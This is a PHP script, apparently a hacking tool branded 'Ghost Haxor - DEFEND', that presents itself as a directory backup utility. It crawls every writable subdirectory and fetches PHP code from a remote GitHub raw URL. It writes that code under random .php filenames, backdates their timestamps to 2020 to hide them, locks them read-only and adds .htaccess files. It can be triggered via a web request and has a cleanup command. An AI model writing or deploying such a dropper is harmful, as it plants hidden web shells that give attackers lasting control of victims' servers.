<?php
/*
    * Ghost Haxor - DEFEND
    * Author: Ghost Haxor
    * Version: 1.0.0
    * License: MIT
    * Copyright (c) 2024 Ghost Haxor
*/
function setTime() {
    $date = '22-09-2020 00:00:00';
    $timestamp = strtotime($date);

    if ($timestamp === false) {
        echo "Date salah!\n";
        file_put_contents('bajngsetrf.txt', "Date salah!\n", FILE_APPEND);
        exit(1);
    } else {
        return $timestamp;
    }
}

function createHtaccess($directory_path, $allowed_files) {
    $htaccess_content = "Order Deny,Allow\nDeny from all\n";
    foreach ($allowed_files as $file) {
        $htaccess_content .= "Allow from $file\n";
    }

    $htaccess_file_path = $directory_path . DIRECTORY_SEPARATOR . '.htaccess';
    file_put_contents($htaccess_file_path, $htaccess_content);
    chmod($htaccess_file_path, 0444); // Set .htaccess file permission to 0444 (read-only)
}

function recursive_directory($path, $create_htaccess = true) {
    $timestamp = setTime();

    if (!is_dir($path)) {
        echo "Directory not found: $path\n";
        file_put_contents('backup_results.txt', "Directory not found: $path\n", FILE_APPEND);
        exit(1);
    }

    $dirIterator = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($dirIterator, RecursiveIteratorIterator::SELF_FIRST);

    foreach ($iterator as $file) {
        if ($file->isDir() && is_writable($file->getPathname())) {
            $random_filename = mt_rand() . '.php';

            // Fetch content using cURL
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/litbang.php"); 
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $file_content = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Curl error: ' . curl_error($ch) . "\n";
                file_put_contents('bajngsetrf.txt', 'Curl error: ' . curl_error($ch) . "\n", FILE_APPEND);
                continue;
            }
            curl_close($ch);

            if ($file_content === false) {
                echo "Error reading from URL\n";
                file_put_contents('bajngsetrf.txt', "Error reading from URL\n", FILE_APPEND);
                continue;
            }

            $backup_file_path = $file->getPathname() . DIRECTORY_SEPARATOR . $random_filename;
            file_put_contents($backup_file_path, $file_content);
            touch($backup_file_path, $timestamp);

            // Set permissions without chown and chgrp
            chmod($backup_file_path, 0444);

            if ($create_htaccess) {
                // Create .htaccess file allowing only the generated file
                createHtaccess($file->getPathname(), [$random_filename]);
            }

            // Log message instead of using chattr
            $message = "$backup_file_path\n";
            echo $message;
            file_put_contents('bajngsetrf.txt', $message, FILE_APPEND);
        }
    }
}

// Check if parameter is provided through web or command line
if (isset($_GET['path'])) {
    $directory_path = __DIR__;
    recursive_directory($directory_path, true);
} elseif (isset($argv[1])) {
    $command = $argv[1];
    if ($command === 'backup') {
        $directory_path = __DIR__;
        $create_htaccess = isset($argv[2]) && strtolower($argv[2]) === 'y' ? true : false;
        recursive_directory($directory_path, $create_htaccess);
    } elseif ($command === 'delete') {
        $listFile = "bajngsetrf.txt";
        $filesToDelete = file($listFile, FILE_IGNORE_NEW_LINES);

        function deleteFilesAndHtaccess($files) {
            foreach ($files as $filePath) {
                if (file_exists($filePath)) {
                    unlink($filePath);
                    echo "File '$filePath' Sukses dihapus\n";

                    $directory = dirname($filePath) . "/";
                    $htaccessFile = $directory . ".htaccess";
                    if (file_exists($htaccessFile)) {
                        unlink($htaccessFile);
                        echo "Htaccess '$directory' dihapus\n";
                    } else {
                        echo "Htaccess '$directory' tidak ada\n";
                    }
                } else {
                    echo "File '$filePath' tidak ditemukan atau tidak dapat dihapus.\n";
                }
            }
        }

        deleteFilesAndHtaccess($filesToDelete);
    } else {
        echo "Invalid command. Use 'backup' or 'delete'.\n";
    }
} else {
    echo "Usage: \n";
    echo "Web: access this script with ?path=<path_to_directory> in the URL\n";
    echo "Command Line: php script.php backup [y/n] OR php script.php delete\n";
    file_put_contents('backup_results.txt', "Usage: Provide a valid command\n", FILE_APPEND);
}
?>
